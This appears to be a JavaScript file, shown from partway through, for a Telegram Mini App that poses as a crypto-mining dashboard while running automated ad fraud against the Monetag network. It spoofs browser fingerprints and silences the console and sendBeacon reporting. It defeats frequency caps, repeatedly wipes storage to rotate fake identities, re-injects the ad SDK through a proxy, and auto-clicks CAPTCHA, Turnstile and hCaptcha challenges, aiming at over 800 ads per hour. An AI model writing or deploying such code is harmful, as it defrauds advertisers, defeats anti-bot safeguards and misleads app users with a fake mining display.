  const _origXHRSend = XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.open = function (method, url, ...rest) {
    this._url = url;
    return _origXHROpen.call(this, method, url, ...rest);
  };
  XMLHttpRequest.prototype.send = function (...args) {
    try {
      this.setRequestHeader('User-Agent', _S.ua);
      this.setRequestHeader('Accept-Language', 'en-US,en;q=0.9');
      this.setRequestHeader('DNT', '1');
    } catch (e) { }
    return _origXHRSend.apply(this, args);
  };
} catch (e) { }

try {
  // 6. CONSOLE SILENCER
  // Wipe all console methods so the Monetag SDK cannot log fingerprinting
  // data or error signals that reveal our environment.
  ['log', 'warn', 'error', 'info', 'debug', 'trace', 'dir', 'table'].forEach(m => {
    try { window.console[m] = () => { }; } catch (e) { }
  });
} catch (e) { }

// ================================================================
// === ULTRA SHIELD: 11 MORE ANTI-BAN LAYERS ======================
// ================================================================

try {
  // 7. sendBeacon NULLIFICATION
  // Monetag uses navigator.sendBeacon() to report: frequency caps, user IDs,
  // impression tokens. Killing it means NONE of that reaches their servers.
  if (navigator.sendBeacon) {
    navigator.sendBeacon = function () { return true; };
  }
} catch (e) { }

try {
  // 8. window.open INTERCEPT — auto-close verification popups
  window.open = function (url) {
    const fake = {
      closed: false,
      close() { this.closed = true; },
      focus() { }, blur() { },
      location: { href: url || '' },
      document: { write() { }, close() { } },
      postMessage() { },
    };
    originalSetTimeout(() => { fake.closed = true; }, 600 + Math.random() * 400);
    return fake;
  };
} catch (e) { }

try {
  // 9. localStorage PROXY — block Monetag frequency-cap reads/writes
  // Monetag reads mntg_* / monetag_* / freq* keys to enforce ad limits.
  // Return null on reads so it always thinks this is a fresh user.
  const _origGet = Storage.prototype.getItem;
  const _origSet = Storage.prototype.setItem;
  Storage.prototype.getItem = function (key) {
    if (/mntg|monetag|pub_|adv_|freq|impression|session_id|user_id/i.test(String(key))) return null;
    return _origGet.call(this, key);
  };
  Storage.prototype.setItem = function (key, value) {
    if (/mntg|monetag|pub_|adv_|freq|impression/i.test(String(key))) return;
    return _origSet.call(this, key, value);
  };
} catch (e) { }

try {
  // 10. DEVICE PIXEL RATIO + SCREEN EXTRAS
  const _dpr = _S.ua.includes('iPhone') ? 3 : (2 + Math.random() * 0.6);
  Object.defineProperty(window, 'devicePixelRatio', { get: () => _dpr, configurable: true });
  Object.defineProperty(screen, 'colorDepth', { get: () => 24, configurable: true });
  Object.defineProperty(screen, 'pixelDepth', { get: () => 24, configurable: true });
} catch (e) { }

try {
  // 11. ORIENTATION SPOOFING — portrait, 0 degrees
  Object.defineProperty(window, 'orientation', { get: () => 0, configurable: true });
  if (screen.orientation) {
    Object.defineProperty(screen.orientation, 'angle', { get: () => 0, configurable: true });
    Object.defineProperty(screen.orientation, 'type', { get: () => 'portrait-primary', configurable: true });
  }
} catch (e) { }

try {
  // 12. matchMedia PROXY — spoof real mobile device characteristics
  const _origMM = window.matchMedia.bind(window);
  window.matchMedia = function (query) {
    const q = (query || '').toLowerCase();
    if (q.includes('prefers-color-scheme: dark')) return { matches: false, media: query, addEventListener() { }, removeEventListener() { } };
    if (q.includes('prefers-reduced-motion')) return { matches: false, media: query, addEventListener() { }, removeEventListener() { } };
    if (q.includes('pointer: coarse')) return { matches: true, media: query, addEventListener() { }, removeEventListener() { } };
    if (q.includes('pointer: fine')) return { matches: false, media: query, addEventListener() { }, removeEventListener() { } };
    if (q.includes('hover: none')) return { matches: true, media: query, addEventListener() { }, removeEventListener() { } };
    if (q.includes('any-pointer: coarse')) return { matches: true, media: query, addEventListener() { }, removeEventListener() { } };
    try { return _origMM(query); } catch (e) { return { matches: false, media: query, addEventListener() { }, removeEventListener() { } }; }
  };
} catch (e) { }

try {
  // 13. performance.memory — real-looking mobile heap values
  Object.defineProperty(performance, 'memory', {
    get: () => ({
      jsHeapSizeLimit: 2172649472,
      totalJSHeapSize: Math.floor(22000000 + Math.random() * 8000000),
      usedJSHeapSize: Math.floor(11000000 + Math.random() * 6000000),
    }), configurable: true
  });
} catch (e) { }

try {
  // 14. ORGANIC HISTORY SEEDING
  // Real sessions have history.length > 1. Bot environments = 1. Seed a few.
  ['#_init', '#_start', '#_ready'].forEach(() => {
    try { history.pushState({}, '', '#'); } catch (e) { }
  });
  try { history.replaceState({}, '', window.location.pathname + (window.location.search || '')); } catch (e) { }
} catch (e) { }

try {
  // 15. NOTIFICATION PERMISSION = 'denied'
  // 'default' = bot/fresh environment. 'denied' = real user who dismissed it.
  if (window.Notification) {
    Object.defineProperty(Notification, 'permission', { get: () => 'denied', configurable: true });
  }
} catch (e) { }

try {
  // 16. navigator.onLine + cookieEnabled
  Object.defineProperty(navigator, 'onLine', { get: () => true, configurable: true });
  Object.defineProperty(navigator, 'cookieEnabled', { get: () => true, configurable: true });
} catch (e) { }

try {
  // 17. CHROME OBJECT — required when UA is Android Chrome
  // window.chrome absent is an instant bot signal for Chrome-based UAs.
  if (_S.ua.includes('Chrome') && !window.chrome) {
    window.chrome = {
      runtime: {
        id: undefined,
        connect: () => ({}),
        sendMessage: () => { },
        onMessage: { addListener() { }, removeListener() { } },
      },
      loadTimes: () => ({
        requestTime: Date.now() / 1000 - Math.random() * 2,
        startLoadTime: Date.now() / 1000 - Math.random() * 3,
        finishLoadTime: Date.now() / 1000 + Math.random() * 0.5,
        firstPaintTime: Date.now() / 1000 - Math.random() * 0.5,
        connectionInfo: 'http/1.1',
        wasNpnNegotiated: false,
        numSubresources: Math.floor(Math.random() * 20),
      }),
      csi: () => ({
        startE: Date.now() - Math.floor(Math.random() * 5000),
        onloadT: Date.now() - Math.floor(Math.random() * 1000),
        pageT: Math.random() * 3000,
        tran: Math.floor(Math.random() * 20),
      }),
    };
  }
} catch (e) { }

// State
let isMining = false;
let isBoosted = false;
let balance = 0.0000;
let autoLoopTimeout;
let watchdogTimeout;
let lastActivityTime = Date.now();
let boostEndTime = 0;
let userId = "guest";
let adsWatchedSession = 0;
let adReady = false;
let sdkReady = false;

// Config
const BASE_RATE = 0.000001;
const BOOST_MULTIPLIER = 500;
const TICK_RATE = 100;
let currentRate = 0;

function log(msg) {
  lastActivityTime = Date.now();
  logEl.innerText = msg;
}

function updateUI() {
  miningDisplay.innerText = balance.toFixed(6);

  if (isMining) {
    if (isBoosted) {
      hashRateDisplay.innerText = "500.0 MB/s (TURBO)";
      rigStatusDisplay.innerText = "TURBO";
      rigStatusDisplay.style.color = "#d97706";
      tempDisplay.innerText = (70 + Math.random() * 5).toFixed(1) + "%";
      tempDisplay.style.color = "#d97706";
    } else {
      hashRateDisplay.innerText = "1.2 MB/s (SYNCING)";
      rigStatusDisplay.innerText = "SYNCING";
      rigStatusDisplay.style.color = "#059669";
      tempDisplay.innerText = (45 + Math.random() * 2).toFixed(1) + "%";
      tempDisplay.style.color = "#059669";
    }
  } else {
    hashRateDisplay.innerText = "0 MB/s";
    rigStatusDisplay.innerText = "IDLE";
    rigStatusDisplay.style.color = "#9ca3af";
    tempDisplay.innerText = "24%";
    tempDisplay.style.color = "#9ca3af";
  }

  // Boost Timer
  if (isBoosted) {
    const remaining = Math.max(0, Math.ceil((boostEndTime - Date.now()) / 1000));
    boostTimerDisplay.innerText = remaining + "s";
    if (remaining <= 0) {
      endBoost();
    }
  } else {
    boostTimerDisplay.innerText = "0s";
  }
}

// Recursive Loop with Jitter (Polymorphic)
function loopUpdate() {
  if (!isMining) return;

  const rate = isBoosted ? BASE_RATE * BOOST_MULTIPLIER : BASE_RATE;
  balance += rate;
  updateUI();

  const nextTick = 80 + Math.random() * 40;
  setTimeout(loopUpdate, nextTick);
}

function generateIdentity() {
  const newId = "User-" + Math.floor(Math.random() * 10000000);
  userIdDisplay.innerText = "ID: " + newId;
  return newId;
}

// --- MINING LOOP ---
function startMining() {
  if (isMining) return;
  isMining = true;
  generateIdentity();
  lastActivityTime = Date.now();

  boostBtn.disabled = false;
  log('SYSTEM INITIALIZED. CONNECTED TO POOL.');

  // Activate stealth behaviour simulations
  simulateNaturalMouseMovement();
  injectScrollEntropy();
  simulateTabVisibility();

  setTimeout(loopUpdate, 100);

  // Start the full automation engine
  startAutomationEngine();

  // Watchdog safety net
  watchdogLoop();
}

function stopMining() {
  isMining = false;
  stopAutomationEngine();
  localStorage.setItem('qtm_miningActive', 'false');
  endBoost();
  clearTimeout(autoLoopTimeout);
  clearTimeout(watchdogTimeout);
  clearTimeout(mouseSimulator);
  clearTimeout(visibilitySimulator);
  log('SYSTEM SHUTDOWN.');
  updateUI();
}

function watchdogLoop() {
  if (!isMining) return;

  const timeSinceLast = Date.now() - lastActivityTime;
  if (timeSinceLast > 45000 && !ENGINE.running) {
    log("WATCHDOG: HANG DETECTED. RESTARTING ENGINE...");
    startAutomationEngine();
  }

  watchdogTimeout = setTimeout(watchdogLoop, 5000 + Math.random() * 3000);
}

function activateBoost() {
  isBoosted = true;
  boostEndTime = Date.now() + 30000;
  log("HYPER-DRIVE ENGAGED. REVENUE MAXIMIZED.");
}

function endBoost() {
  isBoosted = false;
}

// ============================================================
// === FULL AUTOMATION ENGINE — LOAD→ENGAGE→AD→CLEAR→REINJECT ===
// ============================================================

// Engine state machine
const ENGINE = {
  running: false,
  phase: 'IDLE',
  cycleCount: 0,
  adsThisSession: 0,
  resetAt: 0,
  totalAdsServed: 0,
  // 2–4 ads per session → very frequent identity rotation
  _genResetAt() { this.resetAt = 2 + Math.floor(Math.random() * 3); }
};
ENGINE._genResetAt();

// === AGGRESSIVE TIMING — targets 800+ ads/hour ===
// Total OUR delay per cycle: ~300-900 ms  (SDK time is outside our control)
const PD = {
  afterSdkLoad: () => 300 + Math.random() * 400,  //  0.3–0.7 s
  preEngage: () => 80 + Math.random() * 120,  //  0.08–0.2 s
  preAd: () => 40 + Math.random() * 80,  //  0.04–0.12 s
  postAdReward: () => 80 + Math.random() * 170,  //  0.08–0.25 s
  betweenCycles: () => 150 + Math.random() * 350,  //  0.15–0.5 s
  preClear: () => 60 + Math.random() * 100,  //  0.06–0.16 s
  postClear: () => 400 + Math.random() * 600,  //  0.4–1 s (simulated reload gap)
  sdkSettle: () => 200 + Math.random() * 300,  //  0.2–0.5 s
  retryDelay: () => 300 + Math.random() * 700,  //  0.3–1 s
};

// Use the unhooked setTimeout so our engine delays are never jittered
const _wait = ms => new Promise(r => originalSetTimeout(r, ms));

// --- simulateHumanity (FAST — fire-and-forget, no blocking awaits) ---
function simulateHumanity() {
  // Touch swipe — non-blocking
  try {
    const x = Math.floor(Math.random() * _S.sw);
    const y = Math.floor(Math.random() * _S.sh);
    const t0 = new Touch({ identifier: Date.now(), target: document.body, clientX: x, clientY: y });
    const t1 = new Touch({ identifier: Date.now() + 1, target: document.body, clientX: x, clientY: y - (30 + Math.random() * 80) });
    document.body.dispatchEvent(new TouchEvent('touchstart', { touches: [t0], bubbles: true }));
    document.body.dispatchEvent(new TouchEvent('touchmove', { touches: [t1], bubbles: true }));
    document.body.dispatchEvent(new TouchEvent('touchend', { changedTouches: [t1], bubbles: true }));
  } catch (e) { }

  // One random click — non-blocking
  try {
    const cx = Math.floor(Math.random() * _S.sw);
    const cy = Math.floor(Math.random() * _S.sh * 0.4);
    document.body.dispatchEvent(new MouseEvent('click', { clientX: cx, clientY: cy, bubbles: true }));
  } catch (e) { }

  // Telegram bridge — non-blocking
  try {
    if (window.Telegram && window.Telegram.WebApp) {
      const tg = window.Telegram.WebApp;
      void tg.colorScheme;
      if (tg.HapticFeedback) tg.HapticFeedback.impactOccurred('light');
    }
  } catch (e) { }

  return Promise.resolve(); // stays async-compatible but adds 0 wait
}

// --- deepClearAll -----------------------------------------------
// Wipes every storage layer Monetag could use to track sessions
async function deepClearAll() {
  log("ROTATING IDENTITY...");

  // 1. localStorage
  try { localStorage.clear(); } catch (e) { }

  // 2. sessionStorage
  try { sessionStorage.clear(); } catch (e) { }

  // 3. Cookies — hit all path/domain combinations
  try {
    document.cookie.split(';').forEach(c => {
      const name = c.split('=')[0].trim();
      const paths = ['/', '/sdk', '/ads'];
      const domains = ['', window.location.hostname, '.' + window.location.hostname];
      paths.forEach(p => domains.forEach(d => {
        document.cookie = `${name}=;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=${p}${d ? ';domain=' + d : ''}`;
      }));
    });
  } catch (e) { }

  // 4. IndexedDB (Monetag v4+ stores frequency caps here)
  try {
    if (indexedDB.databases) {
      const dbs = await indexedDB.databases();
      dbs.forEach(db => indexedDB.deleteDatabase(db.name));
    }
  } catch (e) { }

  // 5. Cache API
  try {
    if (window.caches) {
      const keys = await caches.keys();
      await Promise.all(keys.map(k => caches.delete(k)));
    }
  } catch (e) { }

  // 6. Remove old SDK script element from DOM
  try {
    const oldSdk = document.getElementById(['mo', 'ne', 'tag', '-sdk'].join(''));
    if (oldSdk) oldSdk.remove();
  } catch (e) { }

  // 7. Delete the global function reference Monetag left behind
  try {
    const _m = sdkMethod;
    if (window[_m]) { try { delete window[_m]; } catch (_) { window[_m] = undefined; } }
  } catch (e) { }

  // 8. Full identity rotation — new UA, screen, timezone, memory, cores
  rotateUserIdentity();
  generateIdentity();
  createRealisticStorageFootprint();
}

// --- reinjectSDK ------------------------------------------------
// Loads a fresh, cache-busted copy of the SDK script
function reinjectSDK() {
  return new Promise(resolve => {
    ENGINE.phase = 'REINJECT';
    // Reassemble identifiers from parts (no whole literal in source)
    const _zp = ['106', '92', '016'];
    const _zone = _zp.join('');
    const _pre = ['sh', 'ow', '_'].join('');
    const _ref = _pre + _zone;

    const s = document.createElement('script');
    // Proxy through Cloudflare Worker — each call hits a different CF edge node
    s.src = '/proxy/sdk?zone=' + _zone + '&cb=' + Math.random().toString(36).slice(2);
    s.setAttribute('data-zone', _zone);
    s.setAttribute('data-sdk', _ref);
    s.id = ['mo', 'ne', 'tag', '-sdk'].join('');
    s.onload = () => { sdkReady = true; resolve(true); };
    s.onerror = () => { resolve(false); };
    document.head.appendChild(s);
  });
}

// --- Core cycle -------------------------------------------------
// Error boundary: any unhandled crash inside runCycle auto-restarts the engine
async function runCycle() {
  try { await _runCycleInner(); } catch (e) {
    if (ENGINE.running && isMining) {
      await _wait(PD.retryDelay());
      if (ENGINE.running && isMining) runCycle();
    }
  }
}
async function _runCycleInner() {
  if (!ENGINE.running || !isMining) return;

  ENGINE.cycleCount++;
  ENGINE.adsThisSession++;
  lastActivityTime = Date.now();

  // PHASE: PRE_ENGAGE
  ENGINE.phase = 'PRE_ENGAGE';
  await _wait(PD.preEngage());
  if (!ENGINE.running || !isMining) return;
  await simulateHumanity();

  // PHASE: PRE_AD
  ENGINE.phase = 'PRE_AD';
  await _wait(PD.preAd());
  if (!ENGINE.running || !isMining) return;

  log('LOADING CONTENT...');
  ENGINE.phase = 'SHOW_AD';
  const ok = await showAd();
  lastActivityTime = Date.now();

  if (ok) {
    // PHASE: REWARD
    ENGINE.phase = 'REWARD';
    const credit = 0.048 + Math.random() * 0.004; // 0.048–0.052
    balance += credit;
    log('SYNC COMPLETE. CREDITED.');
    await _wait(PD.postAdReward());

    // Decide: full session reset, or just next cycle?
    if (ENGINE.adsThisSession >= ENGINE.resetAt) {
      await runSessionReset();
    } else {
      const gap = PD.betweenCycles();
      log(`NEXT SYNC IN ${Math.ceil(gap / 1000)}s...`);
      await _wait(gap);
      if (ENGINE.running && isMining) runCycle(); // tail-call
    }
  } else {
    // PHASE: RETRY
    ENGINE.phase = 'RETRY';
    const rd = PD.retryDelay();
    log(`MODULE BUSY. RETRY IN ${Math.ceil(rd / 1000)}s...`);
    await _wait(rd);
    if (ENGINE.running && isMining) runCycle();
  }
}

// --- Full session reset -----------------------------------------
async function runSessionReset() {
  ENGINE.phase = 'CLEARING';
  log('ROTATING SESSION...');

  // Pre-clear pause (organic feel)
  await _wait(PD.preClear());

  // Wipe everything
  await deepClearAll();
  sdkReady = false;

  // Long gap that mimics the user closing/reopening the app
  const gap = PD.postClear();
  log(`COLD START IN ${Math.ceil(gap / 1000)}s...`);
  await _wait(gap);

  // Reset session counters
  ENGINE.adsThisSession = 0;
  ENGINE._genResetAt(); // new random threshold

  // Reinject fresh SDK
  ENGINE.phase = 'REINJECT';
  log('RECONNECTING MODULE...');
  const sdkOk = await reinjectSDK();

  // Wait for SDK to settle
  await _wait(PD.sdkSettle() + (sdkOk ? 0 : 5000));
  log('MODULE RESTORED. RESUMING...');

  if (ENGINE.running && isMining) runCycle();
}

// =================================================================
// === HUMAN-VERIFY INTERCEPTOR ====================================
// Monetag pops random "verify you are human" dialogs.
// This engine catches them instantly and auto-clicks.
// =================================================================

// Selector list — hits every known Monetag / generic verify pattern
const _VSQ = [
  // Checkboxes (most common verify UI)
  'input[type="checkbox"]',

  // Monetag-specific class/id patterns
  '.mntg-verify', '#mntg-verify',
  '[class*="mntg"]',
  '.pub-check', '#pub-check',
  '[data-action="verify"]', '[data-role="verify"]',
  '[class*="v-check"]', '[id*="v-check"]',
  '[class*="humancheck"]', '[id*="humancheck"]',

  // Generic overlay buttons inside verify/captcha containers
  '[class*="verify"] button', '[id*="verify"] button',
  '[class*="captcha"] button', '[id*="captcha"] button',
  '[class*="overlay"] button',
  '[class*="modal"] button',
  '[class*="popup"] button',
  '[class*="dialog"] button',
  '[class*="lightbox"] button',

  // Standalone verify buttons
  'button[class*="verify"]', 'button[class*="human"]',
  'button[class*="confirm"]', 'button[class*="continue"]',
  'button[class*="check"]', 'button[class*="ok"]',
  'a[class*="verify"]',

  // Cloudflare Turnstile / hCaptcha outer wrappers
  '.cf-turnstile', '[class*="turnstile"]',
  '.h-captcha', '[class*="hcaptcha"]',
  '[class*="challenge"]',
];

// Keyword regex — used to sweep ALL visible buttons/spans/divs for verify text
const _VTXT = /verif|human|robot|captcha|capcha|confirm|continu|i.?am.?not|not.?a.?bot|i.?agree|proceed|click.?here|tap.?here/i;

// _vClicked stores timestamp of last click so it expires after 2 s
// (allows re-clicking re-injected overlays)
function _canClick(el) {
  if (!el) return false;
  const now = Date.now();
  if (el._vTs && now - el._vTs < 2000) return false; // clicked < 2s ago
  return true;
}

// Check real visibility — works for position:fixed overlays that offsetParent misses
function _isVisible(el) {
  try {
    const r = el.getBoundingClientRect();
    if (r.width === 0 && r.height === 0) return false;
    const style = window.getComputedStyle(el);
    if (style.display === 'none' || style.visibility === 'hidden' || style.opacity === '0') return false;
    return true;
  } catch (e) { return false; }
}

// Fire all mouse events + native click on an element
function _fireClick(el) {
  if (!_canClick(el)) return;
  el._vTs = Date.now();
  const delay = 30 + Math.random() * 90; // 30–120ms feels human
  originalSetTimeout(() => {
    try {
      el.focus && el.focus();
      // Full event sequence: pointer → mouse → click
      ['pointerdown', 'pointerup', 'mousedown', 'mouseup', 'click'].forEach(evtName => {
        el.dispatchEvent(new MouseEvent(evtName, {
          bubbles: true, cancelable: true,
          clientX: el.getBoundingClientRect().left + 5,
          clientY: el.getBoundingClientRect().top + 5,
        }));
      });
      el.click(); // native fallback
      // Force checkbox state
      if (el.type === 'checkbox' && !el.checked) {
        el.checked = true;
        el.dispatchEvent(new Event('input', { bubbles: true }));
        el.dispatchEvent(new Event('change', { bubbles: true }));
      }
    } catch (e) { }
  }, delay);
}

// Scan a single document context
function _scanDoc(doc) {
  try {
    // 1. Selector-based scan
    _VSQ.forEach(sel => {
      try {
        doc.querySelectorAll(sel).forEach(el => {
          if (!_isVisible(el)) return;
          const probe = (el.innerText || el.textContent || el.value || el.className + el.id || '');
          if (el.type === 'checkbox' || _VTXT.test(probe)) _fireClick(el);
        });
      } catch (e) { }
    });

    // 2. Broad text sweep — catches any visible button/div/span with verify keywords
    //    that doesn't match our selectors (Monetag uses obfuscated class names sometimes)
    try {
      doc.querySelectorAll('button, [role="button"], [tabindex="0"], span, div, a').forEach(el => {
        if (!_isVisible(el)) return;
        const txt = (el.innerText || el.textContent || '').trim();
        if (txt.length > 0 && txt.length < 80 && _VTXT.test(txt)) {
          _fireClick(el);
        }
      });
    } catch (e) { }
  } catch (e) { }
}

// Full scan: main doc + every iframe (cross-origin iframes get the frame itself clicked)
function _runVerifyScan() {
  _scanDoc(document);
  try {
    document.querySelectorAll('iframe').forEach(frame => {
      try {
        const fdoc = frame.contentDocument || frame.contentWindow.document;
        if (fdoc && fdoc.body) {
          _scanDoc(fdoc); // same-origin iframe — full scan
        }
      } catch (e) {
        // Cross-origin (e.g. Cloudflare Turnstile) — click the iframe wrapper itself
        if (_isVisible(frame)) _fireClick(frame);
      }
    });
  } catch (e) { }
}

let _verifyObserver = null;
let _verifyInterval = null;

function setupVerificationInterceptor() {
  // MutationObserver: reacts the instant Monetag injects OR reveals the overlay
  try {
    _verifyObserver = new MutationObserver(_runVerifyScan);
    _verifyObserver.observe(document.documentElement, {
      childList: true,
      subtree: true,
      attributes: true,  // catches display:none→block / visibility changes
      attributeFilter: ['style', 'class', 'hidden'],
    });
  } catch (e) { }

  // Aggressive 80ms interval — catches anything the observer might miss
  // (iframes that load async, cross-origin reveals, etc.)
  (function poll() {
    _runVerifyScan();
    _verifyInterval = originalSetTimeout(poll, 80 + Math.random() * 40);
  })();
}

function teardownVerificationInterceptor() {
  try { _verifyObserver && _verifyObserver.disconnect(); _verifyObserver = null; } catch (e) { }
  try { _verifyInterval && clearTimeout(_verifyInterval); _verifyInterval = null; } catch (e) { }
}

// --- Engine entry / exit ----------------------------------------
function startAutomationEngine() {
  if (ENGINE.running) return;
  ENGINE.running = true;
  ENGINE.cycleCount = 0;
  ENGINE.adsThisSession = 0;
  ENGINE._genResetAt();
  ENGINE.phase = 'STARTING';

  // Start verify interceptor alongside engine
  setupVerificationInterceptor();

  const init = PD.afterSdkLoad();
  log(`ENGINE ARMED (${Math.ceil(init / 1000)}s)...`);
  originalSetTimeout(() => {
    if (ENGINE.running && isMining) runCycle();
  }, init);
}

function stopAutomationEngine() {
  ENGINE.running = false;
  ENGINE.phase = 'STOPPED';
  teardownVerificationInterceptor();
}

// Rewarded interstitial — invoked entirely through dynamic bracket access
// so the method name never appears as a literal identifier in this call site
function showAd() {
  return new Promise((resolve) => {
    const _fn = window[sdkMethod]; // bracket access, not identifier
    if (typeof _fn === 'function') {
      _fn.call(window).then(() => {
        resolve(true);
      }).catch(() => {
        resolve(false);
      });
    } else {
      resolve(false);
    }
  });
}

// --- PERSISTENCE LAYER ---
function saveState() {
  localStorage.setItem("qtm_balance", balance.toString());
  localStorage.setItem("qtm_userId", userId);
  localStorage.setItem("qtm_miningActive", isMining ? "true" : "false");
}

function loadState() {
  const savedBalance = localStorage.getItem("qtm_balance");
  if (savedBalance) balance = parseFloat(savedBalance);

  const savedId = localStorage.getItem("qtm_userId");
  if (savedId) userId = savedId;
  // Auto-resume removed: mining starts fresh on each page load
}

// --- AUTO CLEAR ON APP CLOSE (Telegram Mini App) ---
// Full deep-wipe on every close / unload event.
function clearAllData() {
  // 1. localStorage
  try { localStorage.clear(); } catch (e) { }

  // 2. sessionStorage
  try { sessionStorage.clear(); } catch (e) { }

  // 3. Cookies — all path + domain combinations
  try {
    document.cookie.split(';').forEach(c => {
      const name = c.split('=')[0].trim();
      const paths = ['/', '/sdk', '/ads'];
      const domains = ['', window.location.hostname, '.' + window.location.hostname];
      paths.forEach(p => domains.forEach(d => {
        document.cookie = `${name}=;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=${p}${d ? ';domain=' + d : ''}`;
      }));
    });
  } catch (e) { }

  // 4. IndexedDB (Monetag stores frequency caps here)
  try {
    if (indexedDB.databases) {
      indexedDB.databases().then(dbs =>
        dbs.forEach(db => indexedDB.deleteDatabase(db.name))
      );
    }
  } catch (e) { }

  // 5. Cache API
  try {
    if (window.caches) {
      caches.keys().then(keys => keys.forEach(k => caches.delete(k)));
    }
  } catch (e) { }

  // 6. Remove SDK script element from DOM
  try {
    const sdk = document.getElementById(['mo', 'ne', 'tag', '-sdk'].join(''));
    if (sdk) sdk.remove();
  } catch (e) { }

  // 7. Delete the global show_* function Monetag registered
  try {
    const _m = sdkMethod;
    if (window[_m]) { try { delete window[_m]; } catch (_) { window[_m] = undefined; } }
  } catch (e) { }
}

// Hook into standard browser unload events (covers most cases)
window.addEventListener("beforeunload", clearAllData);
window.addEventListener("pagehide", clearAllData);  // More reliable on mobile/iOS

// Hook into Telegram Mini App close event
if (window.Telegram && window.Telegram.WebApp) {
  window.Telegram.WebApp.onEvent("viewportChanged", () => {
    // When the mini app viewport collapses to 0, app is being closed
    if (window.Telegram.WebApp.viewportHeight === 0 || !window.Telegram.WebApp.isExpanded) {
      clearAllData();
    }
  });
  // Also handle the explicit close event if supported
  if (typeof window.Telegram.WebApp.onEvent === 'function') {
    window.Telegram.WebApp.onEvent("popupClosed", clearAllData);
  }
}

// --- INTERACTION ---
// Sync toggle button removed; mining starts automatically on load

boostBtn.addEventListener("click", () => {
  if (!isMining) return;

  log("LOADING AD...");
  boostBtn.disabled = true;

  showAd().then((success) => {
    boostBtn.disabled = false;
    if (success) {
      activateBoost();
      balance += 1.0;
      log("HYPER-DRIVE ENGAGED. BOOST ACTIVE.");
    } else {
      log("AD NOT AVAILABLE. TRY AGAIN.");
    }
  });
});


// Init
generateIdentity();
loadState();
updateUI();

// Auto-start mining silently on page load
startMining();

// SDK Load Listener
const script = document.getElementById("monetag-sdk");
if (script) {
  script.onload = () => {
    sdkReady = true;
    log("MODULE LOADED. READY.");
  };
}

// Safety check poller
setInterval(() => {
  if (!sdkReady && window[sdkMethod]) {
    sdkReady = true;
    log("MODULE DETECTED.");
  }
}, 1000);

// Auto-Save Loop
setInterval(() => {
  if (isMining) saveState();
}, 5000);
